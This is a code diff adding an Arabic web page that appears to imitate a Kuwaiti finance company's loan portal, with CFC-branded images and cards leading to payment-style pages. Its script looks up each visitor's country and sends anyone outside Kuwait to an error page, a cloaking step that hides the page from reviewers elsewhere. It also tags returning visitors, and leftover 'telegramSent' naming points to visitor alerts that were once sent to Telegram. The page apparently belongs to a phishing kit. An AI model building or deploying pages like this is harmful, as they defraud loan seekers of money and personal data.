@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تصميم صفحة</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+  body {
+    font-family: 'Noto Sans Arabic', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 0 10px 60px;
+    background: #f7f7f7;
+    color: #222;
+  }
+  .header {
+    width: 100%;
+    height: 100px;
+    background-image: url('cfckuwait.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+  }
+  .cards-container {
+    display: flex;
+    justify-content: flex-end;
+    gap: 20px;
+    padding: 20px;
+  }
+  .card {
+    width: 200px;
+    border-radius: 12px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+    overflow: hidden;
+    background: #fff;
+    text-align: center;
+    transition: transform .25s ease;
+    cursor: pointer;
+  }
+  .card:hover { transform: translateY(-6px); }
+  .card-image { width:100%; height: auto; display:block; border-bottom: 1px solid #eee; }
+  .card-text { padding: 12px; font-size: 15px; color: #333; }
+  #text { text-align: right; padding: 10px 0; }
+  #imgau, #imgau1 { width: 100%; margin: 80px 0; display:block; }
+
+  /* إشعار داخل الصفحة (يشبه تنبيه تليجرام داخلي) */
+  .notice {
+    position: fixed;
+    top: 12px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #e6ffed;
+    border: 1px solid #bde7c9;
+    color: #1b5e20;
+    padding: 12px 16px;
+    border-radius: 8px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+    z-index: 9999;
+    max-width: 92%;
+    text-align: center;
+    font-size: 14px;
+  }
+  .warning-bar {
+    position: fixed;
+    top: 0;
+    right: 0;
+    left: 0;
+    background: #fff3cd;
+    color: #856404;
+    border-bottom: 1px solid #ffeeba;
+    padding: 8px 12px;
+    text-align: center;
+    font-size: 13px;
+    z-index: 9998;
+  }
+</style>
+</head>
+<body>
+
+<div id="warningPlaceholder"></div>
+
+<div class="header"></div>
+
+<h2 id="text">اختر نوع القرض المطلوب</h2>
+
+<div class="cards-container">
+  <div class="card" id="card-commercial">
+    <img src="commercial-loan.jpg" alt="صورة" class="card-image">
+    <div class="card-text">قرض شركات</div>
+  </div>
+
+  <div class="card" id="card-auto">
+    <img src="auto-loan.jpg" alt="صورة" class="card-image">
+    <div class="card-text">قرض سيارة</div>
+  </div>
+
+  <div class="card" id="card-cash">
+    <img src="cash-loan.jpg" alt="صورة" class="card-image">
+    <div class="card-text">قرض نقدي</div>
+  </div>
+</div>
+
+<img id="imgau" src="cfcauto.jpg" alt="">
+<img id="imgau1" src="CFC-Logo.jpg" alt="">
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+  // أولا: وظائف البطاقات كما كانت
+  function initCardLinks() {
+    var c1 = document.getElementById("card-commercial");
+    var c2 = document.getElementById("card-auto");
+    var c3 = document.getElementById("card-cash");
+    if(c1) c1.addEventListener("click", function(){ window.location.href = "paypy.html"; });
+    if(c2) c2.addEventListener("click", function(){ window.location.href = "cashcar.html"; });
+    if(c3) c3.addEventListener("click", function(){ window.location.href = "cash1.html"; });
+  }
+  initCardLinks();
+
+  // منع الإشعارات المكررة خلال نفس الجلسة
+  if (sessionStorage.getItem("telegramSent")) {
+    // سبق عرض الاشعار خلال هذه الجلسة — لا نرسل/نعرض مرة أخرى
+    return;
+  }
+
+  // دالة مساعدة لعرض إشعار داخل الصفحة (مؤقت)
+  function showNotice(text, timeoutMs) {
+    var n = document.createElement("div");
+    n.className = "notice";
+    n.innerText = text;
+    document.body.appendChild(n);
+    if (timeoutMs && timeoutMs > 0) {
+      setTimeout(function(){ n.remove(); }, timeoutMs);
+    }
+    return n;
+  }
+
+  // دالة لعرض شريط تحذير في حال فشل التحقق (لا يمنع الدخول)
+  function showWarningBar(text) {
+    var p = document.getElementById("warningPlaceholder");
+    p.innerHTML = '<div class="warning-bar">'+text+'</div>';
+  }
+
+  // طلب تحديد الدولة مع مهلة (timeout)
+  var controller = new AbortController();
+  var timeout = setTimeout(function(){ controller.abort(); }, 5000); // 5 ثواني
+
+  fetch('https://api.country.is', { signal: controller.signal })
+    .then(function(response){ clearTimeout(timeout); return response.json(); })
+    .then(function(data){
+      var country = data && data.country ? data.country : null;
+
+      // لو البلد معلوم وليست الكويت -> تحويل إلى error.html
+      if (country && country !== "KW") {
+        // يمكنك تعديل السلوك هنا (مثلاً عرض رسالة قبل التحويل)
+        window.location.href = "error.html";
+        return;
+      }
+
+      // لو البلد معلوم وهو الكويت -> عرض إشعار مؤقت داخل الصفحة (بديل التليجرام)
+      if (country === "KW") {
+        sessionStorage.setItem("telegramSent", "true"); // منع التكرار بالجلسة
+        var status = localStorage.getItem("visitorType") ? "زبون قديم" : "زبون جديد";
+        if (!localStorage.getItem("visitorType")) localStorage.setItem("visitorType", "old");
+
+        var message = "حالة الزائر: " + status + " — الدولة: الكويت";
+        // عرض الاشعار لمدة 60 ثانية
+        showNotice(message, 60000);
+      } else {
+        // البلد غير معروف: لا نحجب الزائر لكن نعرض شريط تحذير
+        showWarningBar("تعذر التحقق من دولة الزائر — إذا لم تعمل خدمة التتبع، قد تكون الاستضافة تمنع الطلبات الخارجية.");
+      }
+    })
+    .catch(function(err){
+      // فشل الطلب (CORS أو حظر أو مهلة) : لا نمنع الزوار، فقط نعرض تحذير
+      console.warn("تعذر الحصول على الدولة:", err);
+      showWarningBar("تعذر التحقق من الدولة (فشل الاتصال). الموقع يعمل ولكن خصائص الإشعارات الخارجية قد لا تعمل.");
+    });
+
+});
+</script>
+
+</body>
+</html>
